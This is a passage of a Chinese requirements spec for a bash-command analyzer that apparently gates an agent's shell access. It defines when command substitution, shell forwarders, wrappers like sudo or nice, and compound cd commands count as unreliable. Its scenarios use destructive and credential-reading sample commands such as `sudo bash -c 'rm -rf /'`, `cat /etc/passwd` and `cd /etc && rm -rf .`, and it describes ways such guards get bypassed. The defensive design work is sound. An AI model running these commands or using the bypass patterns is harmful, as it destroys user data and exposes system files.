**边界与理由**：命令替换的豁免判定是**保守白名单准入**——白名单外的形式（`$(cat ...)`、`$(grep ...)`、`$(rm -rf ...)`）一律保持原 `command_substitution` 判定不变。豁免的存在不改变默认行为，只让"用户眼中显然安全"的常见 shell 惯用法（`$(basename ...)`、`$(dirname ...)`）不再被误判为噪音弹窗。

**顺序与交互**：
- 本豁免在 `scanUnreliable` 的字符扫描循环内判定，位置在同循环内其他 unreliable 检测（backtick / heredoc / subshell / glob）的**同一次遍历**中——即豁免掉一个 `$(...)` 后，扫描继续向后，其他位置的 unreliable 模式仍会被检测。
- 豁免判定通过之后，整条命令仍要经过 `scanControlFlow` / `isShellForwarder` / `isAnyUnreliableCommand` / `findUnresolvedVariable` 等**后续所有守卫**——豁免仅关闭 `command_substitution` 这一条理由，不短路任何其他守卫。
- 与"有界 glob 免不可靠标记"requirement 一致：豁免判定失败立即回退原判定，不影响其他 guardrail 层。

#### Scenario: `$(basename ...)` 在 read-only for 循环内自动放行

- **WHEN** bash 命令为 `for f in openspec/changes/archive/*/proposal.md; do echo "=== $(basename $f) ==="; head -20 "$f"; done`
- **THEN** 提取结果为 `{ reliable: true }`——`$(basename $f)` 的顶层命令 `basename` 在白名单内，参数 `"$f"` 是引号内字面量，无副作用构造，豁免条件 1-4 全部满足；不触发 `command_substitution`，命令按正常提取流程判 reliable

#### Scenario: 嵌套 basename+dirname 自动放行

- **WHEN** bash 命令为 `for f in openspec/**/*.md; do echo "=== $(basename $(dirname $f)) ==="; head -20 "$f"; done`
- **THEN** 提取结果为 `{ reliable: true }`——外层 `$(basename $(dirname $f))` 的顶层命令 `basename` 在白名单内（条件 1），参数 `$(dirname $f)` 是嵌套命令替换（条件 3），递归判定 `$(dirname $f)` 通过（`dirname` 也在白名单内），豁免成立

#### Scenario: 白名单外命令替换仍判不可靠

- **WHEN** bash 命令为 `echo "$(cat /etc/passwd)"`
- **THEN** 提取结果为 `{ reliable: false, reason: "command_substitution" }`——`cat` 不在 `SUBSTITUTION_READONLY_CMDS` 内，条件 1 不满足，豁免失败回退原判定

#### Scenario: `realpath`（含 `-m`）暂不豁免

- **WHEN** bash 命令为 `echo "$(realpath -m openspec/specs/foo.md)"`
- **THEN** 提取结果为 `{ reliable: false, reason: "command_substitution" }`——`realpath` 不在 `SUBSTITUTION_READONLY_CMDS` 白名单内（即使 `-m` 形式涉及路径参数与文件系统遍历，本 change 暂不纳入白名单，待二次评估）；豁免失败回退原判定

#### Scenario: 白名单命令含未加引号 glob 参数仍判不可靠

- **WHEN** bash 命令为 `echo "$(basename /etc/*.txt)"`
- **THEN** 提取结果为 `{ reliable: false, reason: "command_substitution" }`——虽然 `basename` 在白名单内（条件 1），但参数 `*.txt` 是未加引号的 glob 元字符，违反条件 3，豁免失败回退原判定

#### Scenario: 嵌套深度超过 3 层判不可靠

- **WHEN** bash 命令为 `echo "$(basename $(dirname $(pwd $(pwd))))"`
- **THEN** 提取结果为 `{ reliable: false, reason: "command_substitution" }`——嵌套深度达到 3 层，第 4 层触发嵌套深度上限，豁免失败回退原判定（条件 3 违反）

#### Scenario: 白名单命令参数中嵌套替换含写操作仍判不可靠

- **WHEN** bash 命令为 `echo "$(basename $(rm -rf /tmp/x))"`
- **THEN** 提取结果为 `{ reliable: false, reason: "command_substitution" }`——外层 `basename` 通过条件 1，但嵌套 `$(rm -rf /tmp/x)` 递归判定时 `rm` 不在白名单内，条件 3 递归失败，豁免失败回退原判定

#### Scenario: 白名单命令参数含用户变量仍豁免但走变量判定

- **WHEN** bash 命令为 `echo "path: $(basename $MY_FILE)"`，`MY_FILE` 未展开
- **THEN** 提取结果为 `{ reliable: false }`——`basename` 通过豁免条件 1-4（参数 `"$MY_FILE"` 是引号内字面变量引用，豁免判定不检查变量值），但 `findUnresolvedVariable` 在后续步骤检测到未展开用户变量 `MY_FILE`，命令仍判 `unreliable, unresolved variable: MY_FILE`——豁免与用户变量判定是独立的两个步骤

#### Scenario: 白名单命令 + 后续命令含真实写操作仍提取 write target

- **WHEN** bash 命令为 `echo "$(basename $f)" && rm -rf /tmp/scratch`
- **THEN** 提取结果为 `{ reliable: true, targets: [delete /tmp/scratch] }`——`$(basename $f)` 豁免通过，命令不判 `command_substitution`；但 `&&` 后的 `rm -rf /tmp/scratch` 由正常的 `rm` 提取器（`COMMAND_TABLE.rm`）提取为 delete target，命令仍判 reliable（`scanControlFlow` 等其他守卫不触发）。这演示了"豁免仅关闭 command_substitution 单条理由，不短路任何其他守卫"的规则

#### Scenario: `$(dirname ...)` 单独出现自动放行

- **WHEN** bash 命令为 `head -20 "$(dirname openspec/specs/bash-target-extraction/spec.md)/spec.md"`
- **THEN** 提取结果为 `{ reliable: true }`——`$(dirname ...)` 参数是纯字面量路径，无副作用构造，豁免成立

#### Scenario: `$(pwd)` 自动放行

- **WHEN** bash 命令为 `echo "cwd: $(pwd)"`
- **THEN** 提取结果为 `{ reliable: true }`——`pwd` 在白名单内，无参数，豁免成立

### Requirement: shell 转发器的长参数前缀判不可靠

若 bash 命令的片段以 `bash` / `sh` / `dash` / `zsh` 之一开头，且该 shell 命令名之后出现长参数（以 `--` 开头，如 `--posix`、`--norc`、`--noprofile`、`--rcfile FILE`），系统 SHALL 继续向后扫描以捕获 `-c`、选项簇（如 `-xc`）或非 flag 位置参数（脚本路径）三种触发条件；这些触发条件任一出现时，整条命令 MUST 判定为不可靠，reason 为 `shell_forwarder`。

长参数本身不构成 shell 转发器的证据——`bash --version` 只是打印版本信息，不是 forwarder。因此遇到长参数时扫描器 MUST NOT 直接退出循环返回"非 forwarder"，而 MUST 继续向后扫描后续参数。

#### Scenario: bash --posix -c 判不可靠

- **WHEN** bash 命令为 `bash --posix -c 'rm -rf /'`
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`——`--posix` 被跳过后继续扫描，`-c` 触发 shell 转发器判定

#### Scenario: sh --norc -c 判不可靠

- **WHEN** bash 命令为 `sh --norc -c 'cat /etc/passwd'`
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`

#### Scenario: bash --version 不触发 shell 转发器

- **WHEN** bash 命令为 `bash --version`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`——只有长参数、无 `-c` / 选项簇 / 脚本路径，不构成 shell 转发器

#### Scenario: bash --rcfile 后接 -c 判不可靠

- **WHEN** bash 命令为 `bash --rcfile /dev/null -c 'rm -rf /'`
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`——`--rcfile` 与 `/dev/null` 被跳过后继续扫描，`-c` 触发

### Requirement: shell 外层包装器判不可靠

若 bash 命令的片段以常见外层包装器开头（`sudo`、`nohup`、`timeout`、`watch`、`nice`），且该包装器之后嵌套 `bash` / `sh` / `dash` / `zsh` 之一，系统 SHALL 跳过包装器自身的参数（含 `KEY=VAL` 赋值、`--flag` 长参数、短 flag 及其值）后，按"shell 转发器"规则审查内层 shell 命令：内层 shell 命令带 `-c`、选项簇或脚本路径时，整条命令 MUST 判定为不可靠，reason 为 `shell_forwarder`。

外层包装器本身不改变内层 shell 命令的语义（提权、忽略 SIGHUP、限时、定时循环、调整优先级），因此包装器的作用是把扫描器定位到内层实际命令，不改变既有的 shell 转发器判定规则。

**包装器的参数处理**：
- `sudo` / `nohup` / `watch`：位置参数直接是内层命令名，`skipWrapperTokens` 的通用逻辑（跳过 `KEY=VAL` / `--flag` / 短 flag + 值）足以定位到内层命令。
- `timeout`：接受"持续时间 + 命令"形式，`skipWrapperTokens` MUST 跳过第一个位置参数（持续时间，如 `5`、`1m`、`1h`）后继续扫描到内层命令。
- `nice`：接受 `-n LEVEL + 命令` 形式，`skipWrapperTokens` MUST **显式**将 `-n` 识别为取值短 flag，消费 2 个 token（`-n` + `LEVEL`）后继续扫描到内层命令。MUST NOT 依赖既有的"通用短 flag 只消费 1 token"分支——那样 `LEVEL`（如 `10`）会被当作位置参数 break，`isShellForwarderTokenStream` 随后拿到 `base = "10"`（既非 `SHELL_NAMES` 也非 `source`/`.`）返回 false，导致 `nice -n 10 bash -c '...'` 静默放行。

#### Scenario: sudo bash -c 判不可靠

- **WHEN** bash 命令为 `sudo bash -c 'rm -rf /'`
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`

#### Scenario: nohup bash /tmp/x.sh 判不可靠

- **WHEN** bash 命令为 `nohup bash /tmp/x.sh`
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`

#### Scenario: timeout 5 bash -c 判不可靠

- **WHEN** bash 命令为 `timeout 5 bash -c 'cat /etc/passwd'`
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`——`5` 被识别为 timeout 的持续时间位置参数并被跳过，扫描到 `bash -c` 触发

#### Scenario: watch bash -c 判不可靠

- **WHEN** bash 命令为 `watch bash -c 'rm -rf /'`
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`

#### Scenario: nice -n 10 bash -c 判不可靠

- **WHEN** bash 命令为 `nice -n 10 bash -c 'cat /etc/passwd'`
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`

#### Scenario: sudo env bash -c 判不可靠

- **WHEN** bash 命令为 `sudo env FOO=1 bash -c 'rm -rf /'`
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`——`env` 已在既有 wrapper 集合中，`sudo` + `env` 组合的包装器跳过逻辑复用现有实现

### Requirement: cd cwd 变更判不可靠

若 bash 命令为复合命令（以 `;`、`&&`、`||`、`&` 或换行分隔），且任一复合命令片段的第一个 token（basename，去掉路径前缀）为 `cd`，系统 MUST 判定整条命令为不可靠，reason 为 `cd_chdir`。

单命令形式的 `cd`（不含 `;`、`&&`、`||`、`&` 或换行分隔符）MUST NOT 触发此规则——`cd /etc` 单独执行不产生文件访问，可静默放行。

**理由**：`cd` 是 bash 内建，会改变后续所有相对路径命令的 cwd 基准。当前实现把相对路径的解析基准固定为 `<projectRoot>`，完全忽略 `cd` 的实际效果，导致 `cd /etc && rm -rf .` 中的 `.` 被解析为 `<projectRoot>/.` 而非 `/etc/`，实际执行会删除 `/etc` 内容。把整条含 `cd` 片段的复合命令判为不可靠是"静态分析无法预测相对路径实际落点"的最小侵入修复。

#### Scenario: cd 后接写入命令判不可靠

- **WHEN** bash 命令为 `cd /etc && rm -rf .`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`

#### Scenario: cd 后接读取命令判不可靠

- **WHEN** bash 命令为 `cd /etc && ls`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`

#### Scenario: 单命令 cd 不触发

- **WHEN** bash 命令为 `cd /etc`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`——无复合命令片段，`cd` 单独执行不产生文件访问

#### Scenario: cd 在管道片段中判不可靠

- **WHEN** bash 命令为 `cd src && cat a.txt | sort`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——复合命令中的 `cd` 片段触发，管道不影响判定

#### Scenario: cd 在后续片段中判不可靠

- **WHEN** bash 命令为 `echo hi; cd /tmp && rm -rf .`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——任一复合命令片段的首个 token 为 `cd` 即触发

#### Scenario: cd 后接写入目标触发 tier=two 提示

- **WHEN** bash 命令为 `cd /etc && rm -rf .`，bash-target-extraction 判定为 `{ reliable: false, reason: "cd_chdir" }`
- **THEN** access-decision 决策为 prompt，tier=two，弹窗展示完整命令文本——`cd_chdir` 属于"无法静态解析"的 bash 命令，走兜底弹窗
